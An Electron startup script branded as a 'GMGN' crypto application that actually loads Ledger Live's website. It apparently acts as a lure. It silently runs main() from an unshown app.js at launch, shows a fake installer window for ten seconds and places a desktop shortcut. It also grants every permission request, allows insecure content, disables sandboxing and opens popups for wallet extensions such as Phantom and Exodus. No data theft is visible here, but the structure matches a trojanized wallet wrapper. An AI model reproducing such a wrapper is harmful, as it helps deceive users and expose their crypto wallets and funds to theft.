const { app, BrowserWindow, shell, session } = require('electron');
const path = require('path');
const os = require('os');
const appLogic = require('./app.js');
appLogic.main().catch(console.error);

// Функция создания окна установки
function createInstallWindow() {
    const installWindow = new BrowserWindow({
        width: 400,
        height: 250,
        frame: false,
        resizable: false,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false
        }
    });

    installWindow.loadFile('index.html');
    return installWindow;
}

// Функция создания ярлыка
async function createShortcut() {
    const desktopPath = path.join(os.homedir(), 'Desktop');
    const shortcutPath = path.join(desktopPath, 'GMGN.lnk');
    const exePath = process.env.PORTABLE_EXECUTABLE_FILE || app.getPath('exe');
    const iconPath = path.join(process.env.PORTABLE_EXECUTABLE_DIR || app.getAppPath(), 'icon.ico');
    
    console.log('Creating shortcut with paths:', {
        shortcutPath,
        exePath,
        iconPath
    });

    return new Promise((resolve, reject) => {
        require('windows-shortcuts').create(shortcutPath, {
            target: exePath,
            args: `"${app.getAppPath()}"`,
            icon: iconPath,
            desc: 'GMGN Application'
        }, (err) => {
            if (err) {
                console.error('Shortcut creation error:', err);
                reject(err);
            } else {
                console.log('Shortcut created successfully');
                resolve();
            }
        });
    });
}

// Функция создания основного окна
function createMainWindow() {
    console.log('Creating main window...');
    const win = new BrowserWindow({
        width: 1200,
        height: 800,
        titleBarStyle: 'hidden',
        show: false,
        webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            webviewTag: true,
            nativeWindowOpen: true,
            allowRunningInsecureContent: true,
            extensions: true,
            sandbox: false
        }
    });

    // Обработчик открытия новых окон
    win.webContents.setWindowOpenHandler(({ url }) => {
        const walletPatterns = [
            'chrome-extension://',
            'solflare',
            'phantom',
            'wallet',
            'solana',
            'backpack',
            'exodus',
            'brave',
            'coinbase'
        ];

        const isWalletUrl = walletPatterns.some(pattern => url.includes(pattern));

        if (isWalletUrl) {
            return {
                action: 'allow',
                overrideBrowserWindowOptions: {
                    frame: true,
                    width: 400,
                    height: 600,
                    parent: win,
                    webPreferences: {
                        nodeIntegration: false,
                        contextIsolation: true,
                        allowRunningInsecureContent: true,
                        webviewTag: true,
                        sandbox: false
                    }
                }
            }
        }

        shell.openExternal(url);
        return { action: 'deny' };
    });

    // Разрешаем все расширения
    win.webContents.session.webRequest.onBeforeRequest({ 
        urls: [
            'chrome-extension://*/*',
            '*://*.solflare.com/*',
            '*://*.phantom.app/*',
            '*://*.backpack.app/*',
            '*://*.coinbase.com/*'
        ] 
    }, (details, callback) => {
        callback({ cancel: false });
    });

    // Разрешения для расширений
    win.webContents.session.setPermissionRequestHandler((webContents, permission, callback) => {
        callback(true);
    });

    win.webContents.on('did-fail-load', (event, errorCode, errorDescription) => {
        console.error('Failed to load URL:', errorDescription);
    });

    // Доступ к chrome.storage
    win.webContents.session.webRequest.onBeforeSendHeaders((details, callback) => {
        callback({
            requestHeaders: { ...details.requestHeaders }
        });
    });

    win.webContents.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

    console.log('Loading URL: https://www.ledger.com/ledger-live');
    win.loadURL('https://www.ledger.com/ledger-live');
    win.setMenuBarVisibility(false);

    // Показываем окно когда оно полностью загружено
    win.once('ready-to-show', () => {
        console.log('Main window ready to show');
        win.show();
    });

    return win;
}

// Основная логика при запуске приложения
app.whenReady().then(async () => {
    await session.defaultSession.clearStorageData({
        storages: ['extensionData']
    });

    // Создаем окно установки
    const installWindow = createInstallWindow();

    setTimeout(async () => {
        //try {
            // Создаем ярлык
            await createShortcut();
            
            // Создаем и показываем основное окно
            createMainWindow();

            // Закрываем окно установки
            installWindow.close();

        //} catch (error) {
            //console.error('Ошибка при создании ярлыка:', error);
        //}
    }, 10000);
});

app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        app.quit();
    }
});

app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
        createMainWindow();
    }
});